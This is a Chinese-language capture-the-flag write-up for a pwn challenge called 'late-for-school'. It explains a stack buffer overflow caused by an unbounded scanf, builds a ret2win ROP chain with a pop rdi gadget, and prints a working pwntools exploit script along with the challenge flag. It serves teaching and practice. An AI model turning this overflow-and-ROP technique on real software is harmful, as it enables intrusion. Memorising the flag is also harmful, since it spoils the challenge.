# late-for-school

## 题目简述

程序在 `run()` 中用无长度限制的 `scanf("%s", run)` 向 0x200 字节栈缓冲区写入数据。二进制关闭 PIE 和栈保护，并提供隐藏函数 `class(int book)`；只有参数等于 `0x13371337` 时该函数才会读取并打印 `flag.txt`。

目标是栈溢出后构造一次 ret2win，并按 amd64 System V ABI 把参数放入 `rdi`。

## 解题过程

通过 cyclic pattern 确认覆盖返回地址需要 520 字节。二进制中可找到：

```text
0x4014f4  pop rdi ; nop ; pop rbp ; ret
0x401371  class
```

ROP 链依次填充 `rdi`、无关的 `rbp`，再返回 `class`：

```python
from pwn import *

p = remote("HOST", PORT)
payload = flat(
    b"A" * 520,
    0x4014f4,
    0x13371337,
    0,
    0x401371,
)
p.sendlineafter(b">", payload)
p.interactive()
```

`class(0x13371337)` 通过检查并打印：

```text
greyhats{m4d3_1t_1n_t1m3_w1th_th3_r1gh7_b00ks}
```

## 方法总结

- 核心技巧：栈溢出后用 `pop rdi` 设置第一个参数，再跳入隐藏 win 函数。
- 识别信号：无界 `%s`、无 Canary、无 PIE、程序中存在带参数的 Flag 函数。
- 复用要点：多弹出一个寄存器的 gadget 要为每个槽位补值；固定地址只适用于对应的无 PIE 构建。
